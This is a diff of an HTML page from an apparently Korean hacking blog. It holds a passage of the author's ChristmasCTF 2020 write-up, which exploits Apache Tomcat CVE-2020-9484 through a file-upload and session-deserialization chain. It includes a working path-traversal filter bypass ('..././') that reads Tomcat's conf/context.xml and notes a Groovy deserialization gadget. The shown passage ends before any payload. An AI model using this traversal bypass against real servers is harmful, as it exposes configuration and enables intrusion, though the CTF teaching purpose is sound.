@@ -61,7 +61,7 @@
   <script src="/js/utils.js"></script>
   <script src="/js/color-schema.js"></script>
 
-<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
+<meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
 </head>
 
 <body>
@@ -189,7 +189,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      968 자
+      2k 자
     </span>
   
 
@@ -199,7 +199,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      19
+      39
        분
     </span>
   
@@ -240,83 +240,83 @@
               <script>
                    (adsbygoogle = window.adsbygoogle || []).push({});
               </script>
-              <h1 id="출제-의도"><a href="#출제-의도" class="headerlink" title="출제 의도"></a>출제 의도</h1><p>올해 초에 발표된 Apache Tomcat CVE-2020-9484를 이용해서 문제를 만들어보고 싶었습니다. 문제를 만들면서 이 취약점이 있는 서비스를 만들고 싶은데… 만약 이런 사이트가 있었다면 어떤 식으로 취약점에 접근할 수 있을까?라는 생각을 하면서 만들었습니다.</p>
-<p>session이 저장되는 위치와 자신이 올린 파일이 업로드되는 위치를 모두 알아야 하고 또 해당 취약점에 취약한 버전이라는 것도 알아야 해서 local에 있는 파일을 모두 볼 수 있으면 되겠다는 생각을 했습니다. <del>lock과 angrforge의 허술함은 여기에서 왔다.</del></p>
-<p>RCE를 활용해야 한다는 것과 실행할 파일의 위치를 <code>special.jsp</code>에 넣어놨는데 좀 더 잘 보이는 곳에 넣어둘 걸… 하는 생각을 했습니다.</p>
+              <h1 id="&#xCD9C;&#xC81C;-&#xC758;&#xB3C4;"><a href="#&#xCD9C;&#xC81C;-&#xC758;&#xB3C4;" class="headerlink" title="&#xCD9C;&#xC81C; &#xC758;&#xB3C4;"></a>&#xCD9C;&#xC81C; &#xC758;&#xB3C4;</h1><p>&#xC62C;&#xD574; &#xCD08;&#xC5D0; &#xBC1C;&#xD45C;&#xB41C; Apache Tomcat CVE-2020-9484&#xB97C; &#xC774;&#xC6A9;&#xD574;&#xC11C; &#xBB38;&#xC81C;&#xB97C; &#xB9CC;&#xB4E4;&#xC5B4;&#xBCF4;&#xACE0; &#xC2F6;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBB38;&#xC81C;&#xB97C; &#xB9CC;&#xB4E4;&#xBA74;&#xC11C; &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC788;&#xB294; &#xC11C;&#xBE44;&#xC2A4;&#xB97C; &#xB9CC;&#xB4E4;&#xACE0; &#xC2F6;&#xC740;&#xB370;&#x2026; &#xB9CC;&#xC57D; &#xC774;&#xB7F0; &#xC0AC;&#xC774;&#xD2B8;&#xAC00; &#xC788;&#xC5C8;&#xB2E4;&#xBA74; &#xC5B4;&#xB5A4; &#xC2DD;&#xC73C;&#xB85C; &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xC744;&#xAE4C;?&#xB77C;&#xB294; &#xC0DD;&#xAC01;&#xC744; &#xD558;&#xBA74;&#xC11C; &#xB9CC;&#xB4E4;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
+<p>session&#xC774; &#xC800;&#xC7A5;&#xB418;&#xB294; &#xC704;&#xCE58;&#xC640; &#xC790;&#xC2E0;&#xC774; &#xC62C;&#xB9B0; &#xD30C;&#xC77C;&#xC774; &#xC5C5;&#xB85C;&#xB4DC;&#xB418;&#xB294; &#xC704;&#xCE58;&#xB97C; &#xBAA8;&#xB450; &#xC54C;&#xC544;&#xC57C; &#xD558;&#xACE0; &#xB610; &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xCDE8;&#xC57D;&#xD55C; &#xBC84;&#xC804;&#xC774;&#xB77C;&#xB294; &#xAC83;&#xB3C4; &#xC54C;&#xC544;&#xC57C; &#xD574;&#xC11C; local&#xC5D0; &#xC788;&#xB294; &#xD30C;&#xC77C;&#xC744; &#xBAA8;&#xB450; &#xBCFC; &#xC218; &#xC788;&#xC73C;&#xBA74; &#xB418;&#xACA0;&#xB2E4;&#xB294; &#xC0DD;&#xAC01;&#xC744; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. <del>lock&#xACFC; angrforge&#xC758; &#xD5C8;&#xC220;&#xD568;&#xC740; &#xC5EC;&#xAE30;&#xC5D0;&#xC11C; &#xC654;&#xB2E4;.</del></p>
+<p>RCE&#xB97C; &#xD65C;&#xC6A9;&#xD574;&#xC57C; &#xD55C;&#xB2E4;&#xB294; &#xAC83;&#xACFC; &#xC2E4;&#xD589;&#xD560; &#xD30C;&#xC77C;&#xC758; &#xC704;&#xCE58;&#xB97C; <code>special.jsp</code>&#xC5D0; &#xB123;&#xC5B4;&#xB1A8;&#xB294;&#xB370; &#xC880; &#xB354; &#xC798; &#xBCF4;&#xC774;&#xB294; &#xACF3;&#xC5D0; &#xB123;&#xC5B4;&#xB458; &#xAC78;&#x2026; &#xD558;&#xB294; &#xC0DD;&#xAC01;&#xC744; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <p><img src="/2020/12/29/idioth/christmasctf2020-gift/image.jpg" srcset="/img/loading.gif"></p>
-<p>제가 웹 알못이다 보니 이런저런 것을 구현할 때 주위의 웹 하는 친구들한테 물어보며 이거 이러이러하게 해서 플래그에 접근하는 건데 게싱이 심하지 않을까? 사람들이 이런 식으로 접근할 수 있을까? 내가 이거 어떻게 하는지 잘 몰라서 이렇게 해봤는데 괜찮을까? 물어보면서 만들었습니다. <del>일단 있는 거 다 해보고 파일은 다 찾아본다며</del></p>
-<p>구현을 도와준다던 놈들은 jsp라고 하니까 다 도망가더군요 하하하… 잡설이 길었습니다.</p>
+<p>&#xC81C;&#xAC00; &#xC6F9; &#xC54C;&#xBABB;&#xC774;&#xB2E4; &#xBCF4;&#xB2C8; &#xC774;&#xB7F0;&#xC800;&#xB7F0; &#xAC83;&#xC744; &#xAD6C;&#xD604;&#xD560; &#xB54C; &#xC8FC;&#xC704;&#xC758; &#xC6F9; &#xD558;&#xB294; &#xCE5C;&#xAD6C;&#xB4E4;&#xD55C;&#xD14C; &#xBB3C;&#xC5B4;&#xBCF4;&#xBA70; &#xC774;&#xAC70; &#xC774;&#xB7EC;&#xC774;&#xB7EC;&#xD558;&#xAC8C; &#xD574;&#xC11C; &#xD50C;&#xB798;&#xADF8;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xB294; &#xAC74;&#xB370; &#xAC8C;&#xC2F1;&#xC774; &#xC2EC;&#xD558;&#xC9C0; &#xC54A;&#xC744;&#xAE4C;? &#xC0AC;&#xB78C;&#xB4E4;&#xC774; &#xC774;&#xB7F0; &#xC2DD;&#xC73C;&#xB85C; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xC744;&#xAE4C;? &#xB0B4;&#xAC00; &#xC774;&#xAC70; &#xC5B4;&#xB5BB;&#xAC8C; &#xD558;&#xB294;&#xC9C0; &#xC798; &#xBAB0;&#xB77C;&#xC11C; &#xC774;&#xB807;&#xAC8C; &#xD574;&#xBD24;&#xB294;&#xB370; &#xAD1C;&#xCC2E;&#xC744;&#xAE4C;? &#xBB3C;&#xC5B4;&#xBCF4;&#xBA74;&#xC11C; &#xB9CC;&#xB4E4;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. <del>&#xC77C;&#xB2E8; &#xC788;&#xB294; &#xAC70; &#xB2E4; &#xD574;&#xBCF4;&#xACE0; &#xD30C;&#xC77C;&#xC740; &#xB2E4; &#xCC3E;&#xC544;&#xBCF8;&#xB2E4;&#xBA70;</del></p>
+<p>&#xAD6C;&#xD604;&#xC744; &#xB3C4;&#xC640;&#xC900;&#xB2E4;&#xB358; &#xB188;&#xB4E4;&#xC740; jsp&#xB77C;&#xACE0; &#xD558;&#xB2C8;&#xAE4C; &#xB2E4; &#xB3C4;&#xB9DD;&#xAC00;&#xB354;&#xAD70;&#xC694; &#xD558;&#xD558;&#xD558;&#x2026; &#xC7A1;&#xC124;&#xC774; &#xAE38;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image0.png" srcset="/img/loading.gif"></p>
-<p>메인 화면입니다. 저기 깃발(flag) 모양에 Special gift가 숨겨져 있다!라고 되어있습니다. 이걸 description에 적어놨으면 참 좋았을걸 왜 안 적어놨지? 일단 로그인을 해야 기능을 볼 수 있는 것 같으니 로그인을 해봅시다.</p>
+<p>&#xBA54;&#xC778; &#xD654;&#xBA74;&#xC785;&#xB2C8;&#xB2E4;. &#xC800;&#xAE30; &#xAE43;&#xBC1C;(flag) &#xBAA8;&#xC591;&#xC5D0; Special gift&#xAC00; &#xC228;&#xACA8;&#xC838; &#xC788;&#xB2E4;!&#xB77C;&#xACE0; &#xB418;&#xC5B4;&#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xAC78; description&#xC5D0; &#xC801;&#xC5B4;&#xB1A8;&#xC73C;&#xBA74; &#xCC38; &#xC88B;&#xC558;&#xC744;&#xAC78; &#xC65C; &#xC548; &#xC801;&#xC5B4;&#xB1A8;&#xC9C0;? &#xC77C;&#xB2E8; &#xB85C;&#xADF8;&#xC778;&#xC744; &#xD574;&#xC57C; &#xAE30;&#xB2A5;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xB294; &#xAC83; &#xAC19;&#xC73C;&#xB2C8; &#xB85C;&#xADF8;&#xC778;&#xC744; &#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p>
 <p><img src="/2020/12/29/idioth/christmasctf2020-gift/image1.png" srcset="/img/loading.gif"></p>
-<p>로그인을 하면 제공하는 기능을 볼 수 있습니다. 사이트에서 제공하는 기능을 정리하면 아래와 같습니다.</p>
+<p>&#xB85C;&#xADF8;&#xC778;&#xC744; &#xD558;&#xBA74; &#xC81C;&#xACF5;&#xD558;&#xB294; &#xAE30;&#xB2A5;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC0AC;&#xC774;&#xD2B8;&#xC5D0;&#xC11C; &#xC81C;&#xACF5;&#xD558;&#xB294; &#xAE30;&#xB2A5;&#xC744; &#xC815;&#xB9AC;&#xD558;&#xBA74; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <ul>
 <li><code>Gift List</code><ul>
-<li>전송한 선물의 리스트를 볼 수 있다.</li>
-<li>file name을 <code>GET</code>을 통해 받는다.</li>
+<li>&#xC804;&#xC1A1;&#xD55C; &#xC120;&#xBB3C;&#xC758; &#xB9AC;&#xC2A4;&#xD2B8;&#xB97C; &#xBCFC; &#xC218; &#xC788;&#xB2E4;.</li>
+<li>file name&#xC744; <code>GET</code>&#xC744; &#xD1B5;&#xD574; &#xBC1B;&#xB294;&#xB2E4;.</li>
 </ul>
 </li>
 <li><code>Send List</code><ul>
-<li>선물을 전송할 수 있다.</li>
+<li>&#xC120;&#xBB3C;&#xC744; &#xC804;&#xC1A1;&#xD560; &#xC218; &#xC788;&#xB2E4;.</li>
 </ul>
 </li>
 <li><code>Community</code><ul>
-<li>게시판 기능으로 글을 작성할 수 있다.</li>
+<li>&#xAC8C;&#xC2DC;&#xD310; &#xAE30;&#xB2A5;&#xC73C;&#xB85C; &#xAE00;&#xC744; &#xC791;&#xC131;&#xD560; &#xC218; &#xC788;&#xB2E4;.</li>
 </ul>
 </li>
 </ul>
-<p>선물을 전송하면 산타가 그 선물을 준다고 하고 gift list에서 올린 선물 리스트의 내용을 확인할 수 있으니 일단 <code>Send List</code>를 통해 선물을 전송하고 난 후 <code>Gift List</code>에서 어떠한 식으로 확인할 수 있는지를 확인해봅시다.</p>
+<p>&#xC120;&#xBB3C;&#xC744; &#xC804;&#xC1A1;&#xD558;&#xBA74; &#xC0B0;&#xD0C0;&#xAC00; &#xADF8; &#xC120;&#xBB3C;&#xC744; &#xC900;&#xB2E4;&#xACE0; &#xD558;&#xACE0; gift list&#xC5D0;&#xC11C; &#xC62C;&#xB9B0; &#xC120;&#xBB3C; &#xB9AC;&#xC2A4;&#xD2B8;&#xC758; &#xB0B4;&#xC6A9;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC73C;&#xB2C8; &#xC77C;&#xB2E8; <code>Send List</code>&#xB97C; &#xD1B5;&#xD574; &#xC120;&#xBB3C;&#xC744; &#xC804;&#xC1A1;&#xD558;&#xACE0; &#xB09C; &#xD6C4; <code>Gift List</code>&#xC5D0;&#xC11C; &#xC5B4;&#xB5A0;&#xD55C; &#xC2DD;&#xC73C;&#xB85C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xB294;&#xC9C0;&#xB97C; &#xD655;&#xC778;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p>
 <p><img src="/2020/12/29/idioth/christmasctf2020-gift/image2.png" srcset="/img/loading.gif"></p>
-<p>txt 파일과 자신들의 secret한 파일만 올릴 수 있다고 하니 일단 txt 파일을 올려봅시다.</p>
+<p>txt &#xD30C;&#xC77C;&#xACFC; &#xC790;&#xC2E0;&#xB4E4;&#xC758; secret&#xD55C; &#xD30C;&#xC77C;&#xB9CC; &#xC62C;&#xB9B4; &#xC218; &#xC788;&#xB2E4;&#xACE0; &#xD558;&#xB2C8; &#xC77C;&#xB2E8; txt &#xD30C;&#xC77C;&#xC744; &#xC62C;&#xB824;&#xBD05;&#xC2DC;&#xB2E4;.</p>
 <p><img src="/2020/12/29/idioth/christmasctf2020-gift/image3.png" srcset="/img/loading.gif"></p>
-<p>전송이 완료된 후 <code>Gift List</code>를 통해 파일 리스트를 확인하면 <code>&lt;name&gt;</code>‘s gift list라는 제목과 함께 업로드한 파일이 표시가 되고 해당 파일의 내용을 확인할 수 있습니다.</p>
+<p>&#xC804;&#xC1A1;&#xC774; &#xC644;&#xB8CC;&#xB41C; &#xD6C4; <code>Gift List</code>&#xB97C; &#xD1B5;&#xD574; &#xD30C;&#xC77C; &#xB9AC;&#xC2A4;&#xD2B8;&#xB97C; &#xD655;&#xC778;&#xD558;&#xBA74; <code>&lt;name&gt;</code>&#x2018;s gift list&#xB77C;&#xB294; &#xC81C;&#xBAA9;&#xACFC; &#xD568;&#xAED8; &#xC5C5;&#xB85C;&#xB4DC;&#xD55C; &#xD30C;&#xC77C;&#xC774; &#xD45C;&#xC2DC;&#xAC00; &#xB418;&#xACE0; &#xD574;&#xB2F9; &#xD30C;&#xC77C;&#xC758; &#xB0B4;&#xC6A9;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <p><img src="/2020/12/29/idioth/christmasctf2020-gift/image4.png" srcset="/img/loading.gif"></p>
 <p><img src="/2020/12/29/idioth/christmasctf2020-gift/image5.png" srcset="/img/loading.gif"></p>
-<p>gift list를 불러올 때 사용되는 <code>&lt;name&gt;</code>은 <code>GET</code>을 통해 불러오는 것으로 추정되므로 해당 인자 값을 수정해봅니다.</p>
+<p>gift list&#xB97C; &#xBD88;&#xB7EC;&#xC62C; &#xB54C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; <code>&lt;name&gt;</code>&#xC740; <code>GET</code>&#xC744; &#xD1B5;&#xD574; &#xBD88;&#xB7EC;&#xC624;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xCD94;&#xC815;&#xB418;&#xBBC0;&#xB85C; &#xD574;&#xB2F9; &#xC778;&#xC790; &#xAC12;&#xC744; &#xC218;&#xC815;&#xD574;&#xBD05;&#xB2C8;&#xB2E4;.</p>
 <p><img src="/2020/12/29/idioth/christmasctf2020-gift/image6.png" srcset="/img/loading.gif"></p>
-<p>name을 변경하자 testa’s gift list를 읽어오고 아무것도 출력이 안 되는 것을 볼 수 있습니다.</p>
-<p>name에 따라 다른 디렉터리를 생성하고 해당 폴더에 파일이 올라간다는 가설을 세우고 path traversal이 가능한지 확인을 해봅시다.</p>
+<p>name&#xC744; &#xBCC0;&#xACBD;&#xD558;&#xC790; testa&#x2019;s gift list&#xB97C; &#xC77D;&#xC5B4;&#xC624;&#xACE0; &#xC544;&#xBB34;&#xAC83;&#xB3C4; &#xCD9C;&#xB825;&#xC774; &#xC548; &#xB418;&#xB294; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
+<p>name&#xC5D0; &#xB530;&#xB77C; &#xB2E4;&#xB978; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xACE0; &#xD574;&#xB2F9; &#xD3F4;&#xB354;&#xC5D0; &#xD30C;&#xC77C;&#xC774; &#xC62C;&#xB77C;&#xAC04;&#xB2E4;&#xB294; &#xAC00;&#xC124;&#xC744; &#xC138;&#xC6B0;&#xACE0; path traversal&#xC774; &#xAC00;&#xB2A5;&#xD55C;&#xC9C0; &#xD655;&#xC778;&#xC744; &#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p>
 <p><img src="/2020/12/29/idioth/christmasctf2020-gift/image7.png" srcset="/img/loading.gif"></p>
-<p>name에 <code>.</code>을 입력하자 아까 위에서 확인한 두 개의 폴더가 나옵니다. 더 위로 올라가 봅시다.</p>
-<p><code>../</code>나 <code>....//</code>은 필터링이 되어 있어 디렉터리 리스팅이 불가능하지만 <code>..././</code>은 가능합니다.</p>
+<p>name&#xC5D0; <code>.</code>&#xC744; &#xC785;&#xB825;&#xD558;&#xC790; &#xC544;&#xAE4C; &#xC704;&#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD55C; &#xB450; &#xAC1C;&#xC758; &#xD3F4;&#xB354;&#xAC00; &#xB098;&#xC635;&#xB2C8;&#xB2E4;. &#xB354; &#xC704;&#xB85C; &#xC62C;&#xB77C;&#xAC00; &#xBD05;&#xC2DC;&#xB2E4;.</p>
+<p><code>../</code>&#xB098; <code>....//</code>&#xC740; &#xD544;&#xD130;&#xB9C1;&#xC774; &#xB418;&#xC5B4; &#xC788;&#xC5B4; &#xB514;&#xB809;&#xD130;&#xB9AC; &#xB9AC;&#xC2A4;&#xD305;&#xC774; &#xBD88;&#xAC00;&#xB2A5;&#xD558;&#xC9C0;&#xB9CC; <code>..././</code>&#xC740; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p>
 <p><img src="/2020/12/29/idioth/christmasctf2020-gift/image8.png" srcset="/img/loading.gif"></p>
-<p>해당 폴더에 진입하면 gift 폴더 안에서 username으로 gift list가 관리되고 있음을 알 수 있습니다.</p>
+<p>&#xD574;&#xB2F9; &#xD3F4;&#xB354;&#xC5D0; &#xC9C4;&#xC785;&#xD558;&#xBA74; gift &#xD3F4;&#xB354; &#xC548;&#xC5D0;&#xC11C; username&#xC73C;&#xB85C; gift list&#xAC00; &#xAD00;&#xB9AC;&#xB418;&#xACE0; &#xC788;&#xC74C;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <p><img src="/2020/12/29/idioth/christmasctf2020-gift/image9.png" srcset="/img/loading.gif"></p>
-<p>한 번 더 올라가면 이러한 디렉터리가 보입니다. tomcat의 상위 디렉터리인데 이를 통해 tomcat을 통해 구동되고 있음을 확인할 수 있습니다. 먼저 웹페이지 소스코드 파일은 webapps에 들어있으므로 해당 디렉터리를 들어가서 어떠한 파일이 있는지 확인해봅시다.</p>
+<p>&#xD55C; &#xBC88; &#xB354; &#xC62C;&#xB77C;&#xAC00;&#xBA74; &#xC774;&#xB7EC;&#xD55C; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xAC00; &#xBCF4;&#xC785;&#xB2C8;&#xB2E4;. tomcat&#xC758; &#xC0C1;&#xC704; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xC778;&#xB370; &#xC774;&#xB97C; &#xD1B5;&#xD574; tomcat&#xC744; &#xD1B5;&#xD574; &#xAD6C;&#xB3D9;&#xB418;&#xACE0; &#xC788;&#xC74C;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBA3C;&#xC800; &#xC6F9;&#xD398;&#xC774;&#xC9C0; &#xC18C;&#xC2A4;&#xCF54;&#xB4DC; &#xD30C;&#xC77C;&#xC740; webapps&#xC5D0; &#xB4E4;&#xC5B4;&#xC788;&#xC73C;&#xBBC0;&#xB85C; &#xD574;&#xB2F9; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xB97C; &#xB4E4;&#xC5B4;&#xAC00;&#xC11C; &#xC5B4;&#xB5A0;&#xD55C; &#xD30C;&#xC77C;&#xC774; &#xC788;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p>
 <p><img src="/2020/12/29/idioth/christmasctf2020-gift/image10.png" srcset="/img/loading.gif"></p>
-<p><code>special.jsp</code>라는 파일이 있네요. 메인에서 special gift가 숨겨져 있다고 했으니 해당 jsp를 확인해봅시다.</p>
+<p><code>special.jsp</code>&#xB77C;&#xB294; &#xD30C;&#xC77C;&#xC774; &#xC788;&#xB124;&#xC694;. &#xBA54;&#xC778;&#xC5D0;&#xC11C; special gift&#xAC00; &#xC228;&#xACA8;&#xC838; &#xC788;&#xB2E4;&#xACE0; &#xD588;&#xC73C;&#xB2C8; &#xD574;&#xB2F9; jsp&#xB97C; &#xD655;&#xC778;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p>
 <p><img src="/2020/12/29/idioth/christmasctf2020-gift/image11.png" srcset="/img/loading.gif"></p>
-<p><code>special_gift</code> 파일을 찾아서 실행하면 이 디렉터리에서 특별한 선물을 볼 수 있다고 합니다.</p>
-<p>tomcat 디렉터리로 가서 RELEASE-NOTES의 내용을 확인해봅시다.</p>
+<p><code>special_gift</code> &#xD30C;&#xC77C;&#xC744; &#xCC3E;&#xC544;&#xC11C; &#xC2E4;&#xD589;&#xD558;&#xBA74; &#xC774; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xC5D0;&#xC11C; &#xD2B9;&#xBCC4;&#xD55C; &#xC120;&#xBB3C;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xB2E4;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;.</p>
+<p>tomcat &#xB514;&#xB809;&#xD130;&#xB9AC;&#xB85C; &#xAC00;&#xC11C; RELEASE-NOTES&#xC758; &#xB0B4;&#xC6A9;&#xC744; &#xD655;&#xC778;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p>
 <p><img src="/2020/12/29/idioth/christmasctf2020-gift/image12.png" srcset="/img/loading.gif"></p>
-<p>tomcat-8.5.54 버전에서 동작하고 있습니다. 해당 버전은 CVE-2020-9484 버전에 영향을 받는 버전이고 해당 취약점에 영향을 받는지 확인하는 방법은 아래와 같습니다.</p>
+<p>tomcat-8.5.54 &#xBC84;&#xC804;&#xC5D0;&#xC11C; &#xB3D9;&#xC791;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xBC84;&#xC804;&#xC740; CVE-2020-9484 &#xBC84;&#xC804;&#xC5D0; &#xC601;&#xD5A5;&#xC744; &#xBC1B;&#xB294; &#xBC84;&#xC804;&#xC774;&#xACE0; &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xC601;&#xD5A5;&#xC744; &#xBC1B;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xC740; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <ul>
-<li>tomcat이 session을 PersistenceManager를 통해 세션을 관리함</li>
-<li>FileStore를 통해 Directory 경로를 지정함</li>
-<li>arbitrary file upload가 가능하며 해당 파일이 어디에 저장되는지 알 수 있음</li>
+<li>tomcat&#xC774; session&#xC744; PersistenceManager&#xB97C; &#xD1B5;&#xD574; &#xC138;&#xC158;&#xC744; &#xAD00;&#xB9AC;&#xD568;</li>
+<li>FileStore&#xB97C; &#xD1B5;&#xD574; Directory &#xACBD;&#xB85C;&#xB97C; &#xC9C0;&#xC815;&#xD568;</li>
+<li>arbitrary file upload&#xAC00; &#xAC00;&#xB2A5;&#xD558;&#xBA70; &#xD574;&#xB2F9; &#xD30C;&#xC77C;&#xC774; &#xC5B4;&#xB514;&#xC5D0; &#xC800;&#xC7A5;&#xB418;&#xB294;&#xC9C0; &#xC54C; &#xC218; &#xC788;&#xC74C;</li>
 </ul>
-<p>현재 arbitrary file upload가 가능하며 파일이 업로드되는 위치도 알 수 있으므로 <code>conf/context.xml</code>을 통해 PersistenceManager를 사용 중인지, 사용 중이라면 FileStore로 Directory를 지정해서 저장하는지, 저장한다면 session이 저장되는 경로는 어딘지 확인합시다.(아까 위에서 sessions 폴더를 본 것 같긴 한데)</p>
-<p><code>detail.jsp?file=..././..././..././conf/context.xml</code>로 접근하면 <code>conf/context.xml</code>의 내용을 확인할 수 있습니다.</p>
+<p>&#xD604;&#xC7AC; arbitrary file upload&#xAC00; &#xAC00;&#xB2A5;&#xD558;&#xBA70; &#xD30C;&#xC77C;&#xC774; &#xC5C5;&#xB85C;&#xB4DC;&#xB418;&#xB294; &#xC704;&#xCE58;&#xB3C4; &#xC54C; &#xC218; &#xC788;&#xC73C;&#xBBC0;&#xB85C; <code>conf/context.xml</code>&#xC744; &#xD1B5;&#xD574; PersistenceManager&#xB97C; &#xC0AC;&#xC6A9; &#xC911;&#xC778;&#xC9C0;, &#xC0AC;&#xC6A9; &#xC911;&#xC774;&#xB77C;&#xBA74; FileStore&#xB85C; Directory&#xB97C; &#xC9C0;&#xC815;&#xD574;&#xC11C; &#xC800;&#xC7A5;&#xD558;&#xB294;&#xC9C0;, &#xC800;&#xC7A5;&#xD55C;&#xB2E4;&#xBA74; session&#xC774; &#xC800;&#xC7A5;&#xB418;&#xB294; &#xACBD;&#xB85C;&#xB294; &#xC5B4;&#xB518;&#xC9C0; &#xD655;&#xC778;&#xD569;&#xC2DC;&#xB2E4;.(&#xC544;&#xAE4C; &#xC704;&#xC5D0;&#xC11C; sessions &#xD3F4;&#xB354;&#xB97C; &#xBCF8; &#xAC83; &#xAC19;&#xAE34; &#xD55C;&#xB370;)</p>
+<p><code>detail.jsp?file=..././..././..././conf/context.xml</code>&#xB85C; &#xC811;&#xADFC;&#xD558;&#xBA74; <code>conf/context.xml</code>&#xC758; &#xB0B4;&#xC6A9;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <p><img src="/2020/12/29/idioth/christmasctf2020-gift/image13.png" srcset="/img/loading.gif"></p>
-<p>PersistentManager, FileStore를 사용하며 session이 저장되는 경로는 <code>/usr/local/tomcat/sessions</code>네요.</p>
-<p>해당 취약점은 session을 deserialize 하면서 일어나는 취약점이므로 gadget도 확인해봅시다.</p>
+<p>PersistentManager, FileStore&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xBA70; session&#xC774; &#xC800;&#xC7A5;&#xB418;&#xB294; &#xACBD;&#xB85C;&#xB294; <code>/usr/local/tomcat/sessions</code>&#xB124;&#xC694;.</p>
+<p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; session&#xC744; deserialize &#xD558;&#xBA74;&#xC11C; &#xC77C;&#xC5B4;&#xB098;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC774;&#xBBC0;&#xB85C; gadget&#xB3C4; &#xD655;&#xC778;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p>
 <p><img src="/2020/12/29/idioth/christmasctf2020-gift/image14.png" srcset="/img/loading.gif"></p>
-<p><code>/lib</code> 폴더에 <code>groovy-2.3.9.jar</code> 가 존재하는 것을 알 수 있습니다.</p>
-<p>이제 <code>special_gift</code> 파일의 위치를 찾아보면</p>
+<p><code>/lib</code> &#xD3F4;&#xB354;&#xC5D0; <code>groovy-2.3.9.jar</code> &#xAC00; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
+<p>&#xC774;&#xC81C; <code>special_gift</code> &#xD30C;&#xC77C;&#xC758; &#xC704;&#xCE58;&#xB97C; &#xCC3E;&#xC544;&#xBCF4;&#xBA74;</p>
 <p><img src="/2020/12/29/idioth/christmasctf2020-gift/image15.png" srcset="/img/loading.gif"></p>
 <p><img src="/2020/12/29/idioth/christmasctf2020-gift/image16.png" srcset="/img/loading.gif"></p>
-<p>최상위 경로에 있는 것을 볼 수 있습니다.(이것도 위치를 알려줬어야…ㅠㅠ) 이제 해당 취약점을 활용하여 <code>special_gift</code> 바이너리를 실행하면 <code>/webapps/ROOT</code> 에 flag 파일이 생성될 것입니다.</p>
-<p>그전에 해당 취약점을 활용하는 것이 맞는지 upload.jsp의 내용으로 올릴 수 있는 special file이 session 파일인지 확인해봅시다.</p>
